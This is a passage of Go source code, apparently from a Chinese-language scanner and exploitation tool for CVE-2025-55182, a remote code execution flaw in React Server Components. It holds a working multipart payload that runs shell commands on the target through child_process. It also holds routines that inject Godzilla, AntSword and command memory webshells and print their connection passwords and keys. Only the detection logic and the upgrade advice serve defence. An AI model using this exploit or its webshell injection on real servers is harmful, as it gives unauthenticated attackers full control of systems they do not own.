			req.Header.Set("Next-Action", "x")
			req.Header.Set("X-Nextjs-Request-Id", utils.RandomString(8))
			req.Header.Set("X-Nextjs-Html-Request-Id", utils.RandomString(20))

			if options.RandomAgent {
				req.Header.Set("User-Agent", cli.GetRandomUserAgent())
			} else {
				req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")
			}

			req.Header.Set("Content-Length", fmt.Sprintf("%d", len(bodyContent)))

			log.LogRequest("POST", attackURL, utils.HeaderMap(req.Header), []byte(bodyContent), baseCtx)

			go func() {
				_, _ = httpClient.Do(req)
			}()
			memoryShellURL := fmt.Sprintf("%s://%s/%s", parsedURL.Scheme, parsedURL.Host, path)
			params := url.Values{}
			params.Add("cmd", "echo QAXNB12138")
			memoryShellTestURL, err := url.Parse(memoryShellURL)
			if err != nil {
				rsChan <- memoryShellResult{
					name:   "CMD内存马",
					url:    memoryShellTestURL.String(),
					result: "失败",
					key:    "",
					pass:   password,
					header: "",
					err:    fmt.Errorf("CMD内存马验证，解析URL失败: %w", err),
				}
				return
			}
			memoryShellTestURL.RawQuery = params.Encode()

			// 减少等待时间，因为我们有重试机制
			time.Sleep(1 * time.Second)

			maxRetries := 3
			retryInterval := 2 * time.Second

			for i := 0; i < maxRetries; i++ {
				log.LogScanStep(fmt.Sprintf("验证CMD内存马 (尝试 %d/%d)", i+1, maxRetries), map[string]interface{}{
					"testURL": memoryShellTestURL.String(),
				}, baseCtx)

				str, err := s.testCmdMemoryConn(memoryShellTestURL.String(), options.Proxy, options.SkipSSL, options.AllowRedirect, log, baseCtx)
				if err == nil {
					rsChan <- memoryShellResult{
						name:   "CMD内存马",
						url:    memoryShellURL,
						result: str,
						key:    "",
						pass:   password,
						header: "",
						err:    nil,
					}
					return
				}

				if i == maxRetries-1 {
					rsChan <- memoryShellResult{
						name:   "CMD内存马",
						url:    memoryShellURL,
						result: "失败",
						key:    "",
						pass:   password,
						header: "",
						err:    fmt.Errorf("CMD内存马验证失败: %w", err),
					}
					return
				}

				time.Sleep(retryInterval)
			}
		}()

	default:
		return "", fmt.Errorf("不支持的内存马类型: %s", shellType)
	}

	// 等待内存马的注入结果
	var results []memoryShellResult
	timeout := time.After(45 * time.Second)

	select {
	case result := <-rsChan:
		results = append(results, result)
	case <-timeout:
		log.LogScanStep("等待内存马注入结果超时", nil, baseCtx)
		return "", fmt.Errorf("内存马注入超时")
	}

	// 构建返回结果
	var successResults []string
	var failedResults []string

	for _, result := range results {
		if result.err != nil {
			failedResults = append(failedResults, fmt.Sprintf("[+] %s注入失败: %v", result.name, result.err))
		} else {
			switch result.name {
			case "哥斯拉内存马":
				successResults = append(successResults, fmt.Sprintf("[+] 注入结果：%s！\n[+] 连接地址: %s\n[+] 连接密码: pass\n[+] 连接秘钥：%s \n[!] 注意事项：需搭配插件https://github.com/BeichenDream/GodzillaNodeJsPayload使用\n[!] 注意事项：配置请求头%s\n", result.result, result.url, result.key, result.header))
			case "蚁剑内存马":
				successResults = append(successResults, fmt.Sprintf("[+] 注入结果：%s！\n[+] 连接地址: %s\n[+] 连接密码: %s\n[+] 连接类型：CMDLINUX\n[+] 编码类型：Base64\n[+] 测试命令：%s\n", result.result, result.url, result.pass, fmt.Sprintf(`curl -X POST %s -d "%s=%s"`, result.url, result.pass, base64.StdEncoding.EncodeToString([]byte("echo QAXNB12138")))))
			case "CMD内存马":
				successResults = append(successResults, fmt.Sprintf("[+] 注入结果：%s！\n", result.result))
			}
		}
	}

	if len(successResults) == 0 {
		return "", fmt.Errorf("内存马注入失败")
	}

	finalResult := fmt.Sprintf("============ CVE-2025-55182 内存马注入结果 ============\n\n%s\n\n", strings.Join(successResults, "\n"))
	if len(failedResults) > 0 {
		finalResult += fmt.Sprintf("============ 失败的注入 ============\n\n%s\n", strings.Join(failedResults, "\n"))
	}

	return finalResult, nil
} // 只支持注入内存马

func (s *CVE202555182Scanner) Scan(ctx context.Context, target string, options ScanOptions) ([]common.Vulnerability, error) {
	var vulnerabilities []common.Vulnerability

	s.statistics = ScanStatistics{}
	s.startTime = time.Now()

	log := options.Logger
	if log == nil {
		log = logger.NewDefaultLogger()
	}

	baseCtx := logger.LogContext{
		Target:      target,
		ScannerName: s.GetScannerName(),
		Timestamp:   time.Now(),
	}

	log.Info("开始CVE-2025-55182漏洞扫描", baseCtx)

	// 创建HTTP客户端
	clientConfig := cli.HTTPClientConfig{
		Timeout:   time.Duration(options.Timeout) * time.Second,
		Proxy:     options.Proxy,
		SkipSSL:   options.SkipSSL,
		UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		Headers:   options.Headers,
		Cookies:   options.Cookies,
	}

	client, err := cli.NewHTTPClient(clientConfig)
	if err != nil {
		log.Error("创建HTTP客户端失败", err, baseCtx)
		return nil, err
	}
	log.LogScanStep("HTTP客户端创建成功", map[string]interface{}{
		"timeout": options.Timeout,
		"proxy":   options.Proxy != "",
		"skipSSL": options.SkipSSL,
	}, baseCtx)

	log.LogScanStep("开始CVE-2025-55182扫描", map[string]interface{}{
		"description":        "CVE-2025-55182是React Server Components（RSC）中存在的一个远程代码执行漏洞。",
		"attackMethod":       "基于RSC所使用的Flight协议层存在不安全反序列化问题",
		"cve":                "CVE-2025-55182",
		"year":               "2025",
		"cvss":               "10.0",
		"severity":           "高",
		"affectedFrameworks": "React Server Components 相关框架和库，例如Next.js等。",
		"poc":                "已公开",
	}, baseCtx)

	// 生成随机路径
	randomPath := "/" + s.generateRandomString(6)
	log.LogScanStep("生成随机路径", map[string]interface{}{
		"randomPath": randomPath,
	}, baseCtx)

	// 构建完整的请求URL
	targetURL, err := s.buildFullURL(target)
	if err != nil {
		log.Error("构建完整URL失败", err, baseCtx)
		return nil, err
	}

	result := s.testVulnerability(ctx, client.GetHTTPClient(), targetURL, randomPath, log, baseCtx)

	// 构建日志上下文，处理result.Response可能为nil的情况
	logContext := map[string]interface{}{
		"isVulnerable": result.IsVulnerable,
		"proof":        result.Proof,
		"body":         string(result.Body),
	}

	// 只有当result.Response不为nil时才添加到日志中
	if result.Response != nil {
		logContext["response"] = *result.Response
	}

	log.LogScanStep("测试漏洞结果", logContext, baseCtx)

	// 分析检测结果
	vulnerabilities = s.analyzeDetectionResult(result, targetURL, randomPath, log, baseCtx)

	// 更新统计信息
	s.statistics.ScanDuration = time.Since(s.startTime)
	s.statistics.VulnerabilitiesFound = len(vulnerabilities)
	s.statistics.TotalRequests = 1

	log.Info(fmt.Sprintf("扫描统计[扫描耗时: %v, 发现漏洞数: %d, 总请求数: %d]",
		s.statistics.ScanDuration, s.statistics.VulnerabilitiesFound, s.statistics.TotalRequests), baseCtx)

	return vulnerabilities, nil

}

// testVulnerability 测试漏洞
func (s *CVE202555182Scanner) testVulnerability(ctx context.Context, client *http.Client, targetURL, path string, log logger.Logger, baseCtx logger.LogContext) DetectionResultCVE {
	result := DetectionResultCVE{
		StrategyName: "React Server Components的高危远程代码执行漏洞",
	}

	// 生成随机边界
	boundary := s.generateRandomString(32)
	testString := "QAXNB12138"

	// 构造JavaScript代码（使用Unicode编码）
	jsCode := fmt.Sprintf("try { var res = process.mainModule.require('child_process').execSync('echo %s').toString('base64'); } catch(e) { var res = 'ERROR'; } throw Object.assign(new Error('x'),{digest:res});", testString)
	jsCodeUnicode := s.stringToUnicode(jsCode)

	// 构建请求体
	body := s.buildMultipartBody(boundary, jsCodeUnicode)

	// 构建完整URL
	fullURL := strings.TrimRight(targetURL, "/") + path

	// headers
	headers := map[string]string{
		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Content-Length":  fmt.Sprintf("%d", len(body)),
		"Content-Type":    fmt.Sprintf("multipart/form-data; boundary=%s", boundary),
		"Accept-Encoding": "gzip, deflate",
		"Next-Action":     "x",
	}

	log.LogScanStep("测试漏洞", map[string]interface{}{
		"url":        fullURL,
		"headers":    headers,
		"body":       body,
		"testString": testString,
	}, baseCtx)

	res, err := http.NewRequestWithContext(ctx, http.MethodPost, fullURL, strings.NewReader(body))
	if err != nil {
		log.Error("创建HTTP请求失败", err, baseCtx)
		result.Error = err
		return result
	}

	log.LogRequest(http.MethodPost, fullURL, headers, []byte(body), baseCtx)

	for k, v := range headers {
		res.Header.Set(k, v)
	}

	// 发送请求
	startTime := time.Now()
	resp, err := client.Do(res)
	duration := time.Since(startTime)
	if err != nil {
		log.Error("发送HTTP请求失败", err, baseCtx)
		result.Error = err
		return result
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		result.Response = resp
		result.Error = err
		return result
	}

	// 检查是否是gzip压缩的响应
	contentEncoding := resp.Header.Get("Content-Encoding")
	if strings.Contains(strings.ToLower(contentEncoding), "gzip") {
		// 解压gzip响应
		reader, err := gzip.NewReader(bytes.NewReader(bodyBytes))
		if err != nil {
			result.Response = resp
			result.Error = err
			return result
		}
		defer reader.Close()

		bodyBytes, err = io.ReadAll(reader)
		if err != nil {
			result.Response = resp
			result.Error = err
			return result
		}
	}

	result.Response = resp
	result.Body = bodyBytes
	// 记录响应
	respHeaders := make(map[string]string)
	for k, v := range resp.Header {
		if len(v) > 0 {
			respHeaders[k] = v[0]
		}
	}
	log.LogResponse(resp.StatusCode, respHeaders, bodyBytes, duration, baseCtx)

	// 检测漏洞
	result.IsVulnerable, result.Proof = s.detectVulnerability(string(bodyBytes), testString, log, baseCtx)

	return result
}

// buildMultipartBody 构建multipart/form-data请求体
func (s *CVE202555182Scanner) buildMultipartBody(boundary, jsCodeUnicode string) string {
	var buf strings.Builder

	// Part 1: JSON payload
	buf.WriteString(fmt.Sprintf("--%s\r\n", boundary))
	buf.WriteString("Content-Disposition: form-data; name=\"0\"\r\n\r\n")
	buf.WriteString(fmt.Sprintf(`{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"%s","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`, jsCodeUnicode))
	buf.WriteString("\r\n")

	// Part 2: "$@0"
	buf.WriteString(fmt.Sprintf("--%s\r\n", boundary))
	buf.WriteString("Content-Disposition: form-data; name=\"1\"\r\n\r\n")
	buf.WriteString("\"$@0\"")
	buf.WriteString("\r\n")

	// Part 3: 空数组
	buf.WriteString(fmt.Sprintf("--%s\r\n", boundary))
	buf.WriteString("Content-Disposition: form-data; name=\"2\"\r\n\r\n")
	buf.WriteString("[]")
	buf.WriteString("\r\n")

	// 结束边界
	buf.WriteString(fmt.Sprintf("--%s--\r\n", boundary))

	return buf.String()
}

// stringToUnicode 将字符串转换为Unicode编码
func (s *CVE202555182Scanner) stringToUnicode(str string) string {
	var result strings.Builder
	for _, r := range str {
		if r <= 0xFFFF {
			result.WriteString(fmt.Sprintf("\\u%04x", r))
		} else {
			// 处理代理对（Surrogate Pair）
			r1, r2 := utf16.EncodeRune(r)
			result.WriteString(fmt.Sprintf("\\u%04x\\u%04x", r1, r2))
		}
	}
	return result.String()
}

// generateRandomString 生成随机字符串
func (s *CVE202555182Scanner) generateRandomString(length int) string {
	bytes := make([]byte, length)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

// DetectionResult 检测结果结构
type DetectionResultCVE struct {
	StrategyName string
	IsVulnerable bool
	Proof        string
	Response     *http.Response
	Body         []byte
	Error        error
}

// detectVulnerability 检测漏洞是否存在
func (s *CVE202555182Scanner) detectVulnerability(responseBody, testString string, log logger.Logger, baseCtx logger.LogContext) (bool, string) {
	// 首先检查响应体是否为空
	if responseBody == "" {
		return false, "响应体为空"
	}

	// // 打印调试信息
	// if len(responseBody) < 1000 {
	// 	log.Debug(fmt.Sprintf("响应体内容: %s", responseBody), baseCtx)
	// }

	// 情况1：查找直接的digest字段（基于您提供的响应格式）
	// 响应格式示例: 1:E{"digest":"UUFYTkIxMjEzOAo="}

	// 尝试提取digest字段的值
	digestValue := s.extractDigestValue(responseBody)
	if digestValue != "" {
		log.Debug(fmt.Sprintf("找到digest值: %s", digestValue), baseCtx)
		// 解码base64字符串
		decoded, err := base64.StdEncoding.DecodeString(digestValue)
		if err == nil {
			decodedStr := string(decoded)
			log.Debug(fmt.Sprintf("解码后的digest: %s", decodedStr), baseCtx)
			// 检查解码后的字符串是否包含测试字符串
			if strings.Contains(decodedStr, testString) {
				return true, fmt.Sprintf("digest字段包含base64编码的测试字符串: %s", testString)
			}
		}
	}

	// 情况2：直接检查响应中是否包含base64编码的测试字符串
	// 注意：echo命令会添加换行符，所以实际base64编码可能不同
	// 我们生成有换行符和无换行符的版本都检查一下

	// 无换行符的base64编码
	base64WithoutNewline := base64.StdEncoding.EncodeToString([]byte(testString))
	log.Debug(fmt.Sprintf("检查base64(无换行符): %s", base64WithoutNewline), baseCtx)

	// 有换行符的base64编码 (echo命令默认会添加\n)
	base64WithNewline := base64.StdEncoding.EncodeToString([]byte(testString + "\n"))
	log.Debug(fmt.Sprintf("检查base64(有换行符): %s", base64WithNewline), baseCtx)

	if strings.Contains(responseBody, base64WithoutNewline) {
		return true, fmt.Sprintf("响应中包含base64编码的测试字符串(无换行符): %s", testString)
	}

	if strings.Contains(responseBody, base64WithNewline) {
		return true, fmt.Sprintf("响应中包含base64编码的测试字符串(有换行符): %s", testString)
	}

	// 情况3：检查响应体中是否有错误的指示
	if strings.Contains(responseBody, "UUFYTkIxMjEzOAo=") {
		// 这是您提供的响应中的base64值
		return true, "响应中包含已知的base64编码测试字符串"
	}

	// 情况4：检查常见的错误响应格式
	if strings.Contains(responseBody, "digest") {
		// 如果响应体包含digest字段，但格式不同，尝试其他解析方式
		lines := strings.Split(responseBody, "\n")
		for _, line := range lines {
			if strings.Contains(line, "digest") {
				// 尝试提取类似 "digest":"xxxxx" 的格式
				start := strings.Index(line, `"digest":`)
				if start != -1 {
					start += len(`"digest":`)
					// 跳过空格
					for start < len(line) && (line[start] == ' ' || line[start] == '\t') {
						start++
					}
					if start < len(line) && line[start] == '"' {
						start++
						end := strings.Index(line[start:], `"`)
						if end != -1 {
							digest := line[start : start+end]
							log.Debug(fmt.Sprintf("从行中提取digest: %s", digest), baseCtx)
							decoded, err := base64.StdEncoding.DecodeString(digest)
							if err == nil {
								decodedStr := string(decoded)
								if strings.Contains(decodedStr, testString) {
									return true, fmt.Sprintf("从响应行中提取到digest字段包含测试字符串: %s", testString)
								}
							}
						}
					}
				}
			}
		}
	}

	log.Debug("未找到漏洞证据", baseCtx)
	return false, ""
}

// extractDigestValue 从响应中提取digest字段的值
func (s *CVE202555182Scanner) extractDigestValue(responseBody string) string {
	// 查找"digest"字段
	digestStart := strings.Index(responseBody, `"digest":`)
	if digestStart == -1 {
		return ""
	}

	// 跳过"digest":这部分
	valueStart := digestStart + len(`"digest":`)

	// 跳过可能的空格
	for valueStart < len(responseBody) && (responseBody[valueStart] == ' ' || responseBody[valueStart] == '\t') {
		valueStart++
	}

	// 期望下一个字符是双引号
	if valueStart >= len(responseBody) || responseBody[valueStart] != '"' {
		return ""
	}

	// 跳过开头的双引号
	valueStart++

	// 找到结束的双引号
	valueEnd := strings.Index(responseBody[valueStart:], `"`)
	if valueEnd == -1 {
		return ""
	}

	valueEnd += valueStart

	// 提取digest值
	digestValue := responseBody[valueStart:valueEnd]

	return digestValue
}

// analyzeDetectionResult 分析检测结果
func (s *CVE202555182Scanner) analyzeDetectionResult(result DetectionResultCVE, baseURL, path string, log logger.Logger, baseCtx logger.LogContext) []common.Vulnerability {
	var vulnerabilities []common.Vulnerability

	// 输出调试信息
	log.LogScanStep("分析检测结果", map[string]interface{}{
		"isVulnerable": result.IsVulnerable,
		"strategy":     result.StrategyName,
		"statusCode": func() int {
			if result.Response != nil {
				return result.Response.StatusCode
			}
			return 0
		}(),
	}, baseCtx)

	if result.IsVulnerable {
		// 提取响应内容
		responseContent := ""
		if len(result.Body) > 0 {
			responseContent = string(result.Body)
			if len(responseContent) > 1000 {
				responseContent = responseContent[:1000] + "...[截断]"
			}
		}

		// 构造响应头映射
		responseHeaders := make(map[string]string)
		if result.Response != nil {
			for k, v := range result.Response.Header {
				if len(v) > 0 {
					responseHeaders[k] = v[0]
				}
			}
		}

		// 提取digest字段并解码
		digestValue := s.extractDigestValue(string(result.Body))
		decodedStr := ""
		if digestValue != "" {
			decoded, err := base64.StdEncoding.DecodeString(digestValue)
			if err == nil {
				decodedStr = string(decoded)
			}
		}

		// 构建payload
		boundary := s.generateRandomString(32)
		// 构造JavaScript代码（使用Unicode编码）
		jsCode := fmt.Sprintf("try { var res = process.mainModule.require('child_process').execSync('echo %s').toString('base64'); } catch(e) { var res = 'ERROR'; } throw Object.assign(new Error('x'),{digest:res});", decodedStr)
		jsCodeUnicode := s.stringToUnicode(jsCode)

		// 构建请求体
		body := s.buildMultipartBody(boundary, jsCodeUnicode)

		// 创建漏洞详情
		vulnerability := common.Vulnerability{
			ID:                1,
			VulnerabilityType: "CVE-2025-55182",
			Severity:          "严重",
			Target:            baseURL,
			URL:               fmt.Sprintf("%s%s(post)echo %s", baseURL, path, decodedStr),
			Payload:           body,
			Description:       "未经身份验证的攻击者能够向目标服务器发送特制的恶意HTTP请求，诱导服务器端的Node.js进程调用并执行其内置模块（如child_process），从而在服务器上实现任意远程代码执行，完全控制服务器.",
			Proof:             result.Proof,
			Recommendation:    "React官方已发布安全版本修复此漏洞，受影响用户应立即升级至最新安全版本。React相关包需升级至19.0.1、19.1.2或19.2.1版本，Next.js框架需升级至相应修复版本如15.0.5、15.1.9、15.2.6、15.3.6、15.4.8、15.5.7或16.0.7等。",
			ResponseHeaders:   responseHeaders,
			ResponseContent:   responseContent,
			Timestamp:         time.Now(),
		}

		vulnerabilities = append(vulnerabilities, vulnerability)
		log.LogVulnerabilityFound(vulnerability, baseCtx)
	} else {
		log.Info("未检测到漏洞", baseCtx)
	}

	return vulnerabilities
}

// buildFullURL 构建完整的请求URL
func (s *CVE202555182Scanner) buildFullURL(inputURL string) (string, error) {
	// 解析输入的URL
	parsedURL, err := url.Parse(inputURL)
	if err != nil {
		return "", err
	}

	// 构造新的的URL
	baseURL := &url.URL{
		Scheme: parsedURL.Scheme,
		Host:   parsedURL.Host,
	}

	// 生成URL字符串并去除尾部斜杠
	result := baseURL.String()
	return strings.TrimSuffix(result, "/"), nil
}
